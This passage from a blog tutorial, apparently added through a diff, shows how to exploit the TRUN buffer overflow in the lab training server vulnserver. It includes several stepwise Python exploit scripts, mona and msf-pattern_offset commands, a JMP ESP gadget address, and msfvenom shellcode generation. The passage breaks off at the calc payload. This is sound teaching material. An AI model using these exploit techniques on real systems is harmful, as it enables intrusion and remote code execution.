+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"TRUN /."</span>
+<span class="c1">#buf += b"A" * size</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">pattern</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>After running this program we can once again check the value of the EIP on crash:</p>
+<p><strong>EIP value on crash:</strong> 6F43386F</p>
+<p>Now we can determine the exact offset using another metasploit tool:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ msf-pattern_offset -l <span class="m">4096</span> -q 6F43386F
+
+<span class="o">[</span>*<span class="o">]</span> Exact match at offset <span class="m">2005</span>
+</code></pre></div></div></div>
+<p>Let us confirm that we have control over the EIP:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># TRUN - Step 3 - control eip</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">2005</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"TRUN /."</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"B"</span> <span class="o">*</span> <span class="mi">4</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"C"</span> <span class="o">*</span> <span class="mi">4</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"D"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="c1"># expected result:</span>
+<span class="c1"># EIP content on crash: 42424242</span>
+<span class="c1"># b'B' = 0x42</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>That appears to have worked. We have control over the EIP:</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="EIP under control" src="/assets/img/vulnserver_trun_11_eip_control.png"/></div></div></p>
+<h2 id="bad-characters">Bad Characters<a class="headerlink" href="#bad-characters" title="Permanent link"> </a></h2>
+<p>The next step is figuring out what characters might break our exploit. We need to find the so-called "Bad Characters" or "Bad Chars".</p>
+<p>These are usually byte values that have a special control function in the target application. </p>
+<p>For example the null byte (0x00) indicates the end of a C-style string. Quite often all content after such a null byte might be ignored and will not be written onto the stack. </p>
+<p>Other common bad chars are the new-line "\n" (0x0A) and the carriage return "\a" (0x0D).</p>
+<p>In this example we are just sending bytes over a plain old TCP socket with no special protocol, but if we had to supply our buffer via an HTTP request with <code>x-www-urlencoded</code> body, then the url control characters '?' and '&amp;' would also most likely be bad chars.</p>
+<p>In this way the bad chars are somewhat predictable, but it is usually better to test all possible byte values just to be sure.</p>
+<p>I have added a badchar generator to our exploit:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># TRUN - Step 4 - find bad characters</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">2005</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="c1"># new line 0x0a</span>
+
+<span class="c1"># generate bad char test string</span>
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0a</span> <span class="p">]</span> <span class="c1"># found badchars to exclude. We can assume 0x00 and 0x0a (new line) are bad chars without trying</span>
+<span class="n">badstring</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">):</span>
+        <span class="n">badstring</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">x</span><span class="p">])</span>
+
+<span class="c1"># write generated badchars to file for mona</span>
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/srv/samba/protected/badchars.bin'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">badstring</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"TRUN /."</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"B"</span> <span class="o">*</span> <span class="mi">4</span>         <span class="c1"># EIP overwrite</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"C"</span> <span class="o">*</span> <span class="mi">4</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">badstring</span>        <span class="c1"># put the badchar test string after the EIP overwrite</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"D"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">badstring</span><span class="p">))</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>The created test bytes will be appended after the EIP overwrite. This ensures that the application will definitely crash even if there are badchars included after the overwrite.</p>
+<p>The script will also generate a file containing the bytes that we want to test. I have transfered this created file to the Windows machine via a mounted samba share. But you can of course also transfer it via some other method.</p>
+<p>Once the server is in the crashed state you will find the badchar test string after the EIP overwrite:</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Badchar test string" src="/assets/img/vulnserver_trun_20_badchars.png"/></div></div></p>
+<p>Copy the stack address where our badchar test string starts:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>0111F9CC   <span class="m">04030201</span> 
+</code></pre></div></div></div>
+<p>This address will differ with each execution, so the above address is just an example. Leave the server in the crashed state.</p>
+<p>Use this mona command in order to compare our exported badchars file with the stack content:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>!mona compare -f Y:<span class="se">\b</span>adchars.bin -a 0111F9CC
+</code></pre></div></div></div>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Badchar mona compare" src="/assets/img/vulnserver_trun_21_badchars_mona_command.png"/></div></div></p>
+<p>Mona will report that the comparison between file and stack content found no modifications:</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Badchar mona compare results" src="/assets/img/vulnserver_trun_22_badchars_mona_result.png"/></div></div></p>
+<p>This means we found all badchars already and can move on to the next step.</p>
+<p>If you want to restore the regular layout of Immunity, then just close all the inner windows and click on <code>View</code> -&gt; <code>CPU</code>. The usual layout should pop up, maximize it and you are back to normal.</p>
+<h2 id="jmp-esp">JMP ESP<a class="headerlink" href="#jmp-esp" title="Permanent link"> </a></h2>
+<p>Now that we found all badchars we can try to execute some instructions.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="EIP under control" src="/assets/img/vulnserver_trun_11_eip_control.png"/></div></div></p>
+<p>Normally the program will attempt to jump to the address that is stored on the stack where we wrote our four B's.</p>
+<p>Now it sounds tempting to just jump to the address where our A's begin, put some shellcode there and call it a day. But sadly the address layout on the stack will differ with each execution. Those addresses are not static.</p>
+<p>But as it so happens at the time of the crash there are two registers that hold addresses that we can use. </p>
+<p>As you can see in the screenshot above, the ESP points right after the <code>BBBB</code>, at the <code>CCCC</code>. And the EAX points to the beginning of our buffer "<code>TRUN /.AAAAA...</code>".</p>
+<p>The ESP register is the more convenient choice. We can put our shellcode right after the <code>BBBB</code> and perform a jump to ESP (the address stored in the ESP register).</p>
+<p>In order to perform this little maneuver, we will need to find a code snippet with a static address that performs a <code>JMP ESP</code> instruction. If we jump to the start of that <code>JMP ESP</code> instruction, then the program will execute it and we end up right back on the stack in the <code>CCCC</code> section. Everything there (starting with the C's) will then be executed.</p>
+<p>Another useful metasploit tool allows us to figure out the byte value of that x86 instruction:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ msf-nasm_shell
+
+nasm &gt; jmp esp
+<span class="m">00000000</span> FFE4 jmp esp
+</code></pre></div></div></div>
+<p>Mona allows us to find possible candidates where we might find that byte snippet <code>FFE4</code>:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>!mona modules
+</code></pre></div></div></div>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Mona modules" src="/assets/img/vulnserver_trun_30_mona_modules.png"/></div></div></p>
+<p>Modules where most of the protections are disabled ("False") are preferable. This leaves us with <code>essfunc.dll</code> and the main binary <code>vulnserver.exe</code>.</p>
+<p>We can once again use Mona in order to scan these modules for our desired byte sequence <code>FFE4</code>.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>!mona find -s <span class="s2">"\xff\xe4"</span> -m <span class="s2">"vulnserver.exe"</span>
+found <span class="m">0</span> pointers
+</code></pre></div></div></div>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>!mona find -s <span class="s2">"\xff\xe4"</span> -m <span class="s2">"essfunc.dll"</span>
+found <span class="m">9</span> pointers
+</code></pre></div></div></div>
+<p>The main binary is a bust, but <code>essfunc.dll</code> has 9 possible candidates.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="JMP ESP candidates" src="/assets/img/vulnserver_trun_31_possible_jmp_esp.png"/></div></div></p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>0x625011af : <span class="s2">"\xff\xe4"</span> <span class="p">|</span>  <span class="o">{</span>PAGE_EXECUTE_READ<span class="o">}</span> <span class="o">[</span>essfunc.dll<span class="o">]</span> ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\I</span>EUser<span class="se">\D</span>esktop<span class="se">\e</span>ssfunc.dll<span class="o">)</span>
+0x625011bb : <span class="s2">"\xff\xe4"</span> <span class="p">|</span>  <span class="o">{</span>PAGE_EXECUTE_READ<span class="o">}</span> <span class="o">[</span>essfunc.dll<span class="o">]</span> ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\I</span>EUser<span class="se">\D</span>esktop<span class="se">\e</span>ssfunc.dll<span class="o">)</span>
+0x625011c7 : <span class="s2">"\xff\xe4"</span> <span class="p">|</span>  <span class="o">{</span>PAGE_EXECUTE_READ<span class="o">}</span> <span class="o">[</span>essfunc.dll<span class="o">]</span> ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\I</span>EUser<span class="se">\D</span>esktop<span class="se">\e</span>ssfunc.dll<span class="o">)</span>
+0x625011d3 : <span class="s2">"\xff\xe4"</span> <span class="p">|</span>  <span class="o">{</span>PAGE_EXECUTE_READ<span class="o">}</span> <span class="o">[</span>essfunc.dll<span class="o">]</span> ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\I</span>EUser<span class="se">\D</span>esktop<span class="se">\e</span>ssfunc.dll<span class="o">)</span>
+0x625011df : <span class="s2">"\xff\xe4"</span> <span class="p">|</span>  <span class="o">{</span>PAGE_EXECUTE_READ<span class="o">}</span> <span class="o">[</span>essfunc.dll<span class="o">]</span> ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\I</span>EUser<span class="se">\D</span>esktop<span class="se">\e</span>ssfunc.dll<span class="o">)</span>
+0x625011eb : <span class="s2">"\xff\xe4"</span> <span class="p">|</span>  <span class="o">{</span>PAGE_EXECUTE_READ<span class="o">}</span> <span class="o">[</span>essfunc.dll<span class="o">]</span> ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\I</span>EUser<span class="se">\D</span>esktop<span class="se">\e</span>ssfunc.dll<span class="o">)</span>
+0x625011f7 : <span class="s2">"\xff\xe4"</span> <span class="p">|</span>  <span class="o">{</span>PAGE_EXECUTE_READ<span class="o">}</span> <span class="o">[</span>essfunc.dll<span class="o">]</span> ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\I</span>EUser<span class="se">\D</span>esktop<span class="se">\e</span>ssfunc.dll<span class="o">)</span>
+0x62501203 : <span class="s2">"\xff\xe4"</span> <span class="p">|</span> ascii <span class="o">{</span>PAGE_EXECUTE_READ<span class="o">}</span> <span class="o">[</span>essfunc.dll<span class="o">]</span> ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\I</span>EUser<span class="se">\D</span>esktop<span class="se">\e</span>ssfunc.dll<span class="o">)</span>
+0x62501205 : <span class="s2">"\xff\xe4"</span> <span class="p">|</span> ascii <span class="o">{</span>PAGE_EXECUTE_READ<span class="o">}</span> <span class="o">[</span>essfunc.dll<span class="o">]</span> ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\I</span>EUser<span class="se">\D</span>esktop<span class="se">\e</span>ssfunc.dll<span class="o">)</span>
+</code></pre></div></div></div>
+<p>In order to be usable, an address must not contain any of our found badchars. But it does not look like any of these addresses contain any badchars. They should all be usable.</p>
+<p>So I went with the first one.</p>
+<p>Make sure you write the address in small endian byte order onto the stack. The <code>struct</code> python standard library can take care of that for you:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="n">esp_gadget_address</span> <span class="o">=</span> <span class="mh">0x625011af</span>
+<span class="n">esp_gadget</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">esp_gadget_address</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>Here is the full script at this point:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># TRUN - Step 5 - JMP ESP</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">2005</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="c1"># new line 0x0a</span>
+
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0a</span> <span class="p">]</span> <span class="c1"># found badchars</span>
+
+<span class="n">esp_gadget_address</span> <span class="o">=</span> <span class="mh">0x625011af</span>
+<span class="n">esp_gadget</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">esp_gadget_address</span><span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"TRUN /."</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="n">offset</span>
+
+<span class="c1">#buf += b"B" * 4         # EIP overwrite</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">esp_gadget</span>        <span class="c1"># JMP ESP</span>
+
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"C"</span> <span class="o">*</span> <span class="mi">4</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"D"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>Before you run this you should set a breakpoint on the address <code>625011af</code>. Reset the server and then use the black arrow in the menubar:</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Go to JMP ESP address" src="/assets/img/vulnserver_3_goto.png"/></div></div></p>
+<p>Once you are there and the <code>FFE4</code> is selected press <code>&lt;F2&gt;</code> in order to toggle a breakpoint. Now you can resume the execution by pressing <code>&lt;F9&gt;</code> or the red play button.</p>
+<p>Run the script. </p>
+<p>You should hit the breakpoint. </p>
+<p>Use <code>&lt;F7&gt;</code> in order to step forward. With each step it should be executing the C's and afterwards hitting the D's.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="JMP ESP worked" src="/assets/img/vulnserver_trun_40_jmp_esp_success.png"/></div></div></p>
+<p>The C's will be interpreted as instruction <code>0x43</code> <code>INC EBX</code> and the D's will be interpreted as instruction <code>0x44</code> <code>INC ESP</code>.</p>
+<p>Looks like we achieved code execution!</p>
+<h2 id="pop-calc">Pop Calc<a class="headerlink" href="#pop-calc" title="Permanent link"> </a></h2>
+<p>Before we send ourselves a reverse shell it is often a good idea to run a simpler shellcode first in order to make sure we have not missed anything.</p>
+<p>A popular target is the notorious Windows calculator.</p>
+<p>You can use (once again) a metasploit tool named msfvenom in order to create this payload:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ msfvenom -p windows/exec <span class="nv">CMD</span><span class="o">=</span>calc.exe -b <span class="s1">'\x00\x0A'</span> -f python -v payload
+
+<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
+Found <span class="m">11</span> compatible encoders
+Attempting to encode payload with <span class="m">1</span> iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size <span class="m">220</span> <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span><span class="m">0</span><span class="o">)</span>
+x86/shikata_ga_nai chosen with final size <span class="m">220</span>
+Payload size: <span class="m">220</span> bytes
+Final size of python file: <span class="m">1180</span> bytes
+<span class="nv">payload</span> <span class="o">=</span>  b<span class="s2">""</span>
+<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">"\xdb\xc1\xbf\x08\x54\xa2\x44\xd9\x74\x24\xf4\x5a"</span>
+<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">"\x29\xc9\xb1\x31\x31\x7a\x18\x83\xea\xfc\x03\x7a"</span>
+<span class="c1"># ...</span>
+</code></pre></div></div></div>
+<p>Please note that we gave msfvenom our badchars via the <code>-b</code> parameter.</p>
+<p>But if you just put that payload right after the EIP overwrite you will notice it does not work.</p>
+<p>Often shellcode requires some space to "do its thing".</p>
+<p>That's why it is common practice to add some NOP's before the shellcode. There are some other methods, but I don't want to get into the weeds here.</p>
+<p>A NOP <code>0x90</code> instruction is short for "no operation". It simply does nothing. That makes it useful for padding and stack alignment.</p>
+<p>I added 32 NOPs before the pop calc shellcode, for good measures.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="n">NOP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span>
+<span class="c1"># ...</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">NOP</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">payload</span>
+<span class="c1"># ...</span>
+</code></pre></div></div></div>
+<p>We have enough space after the EIP overwrite, so it does not matter too much.</p>
+<p>Here is the calc popper script:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># TRUN - Step 6 - Pop Calc</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">2005</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>         <span class="c1"># new line 0x0a</span>
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0a</span> <span class="p">]</span>   <span class="c1"># found badchars</span>
+<span class="n">esp_gadget_address</span> <span class="o">=</span> <span class="mh">0x625011af</span>
+<span class="n">esp_gadget</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">esp_gadget_address</span><span class="p">)</span>
+<span class="n">NOP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span>
+
+<span class="c1"># msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0A' -f python -v payload</span>
+<span class="n">payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">""</span>
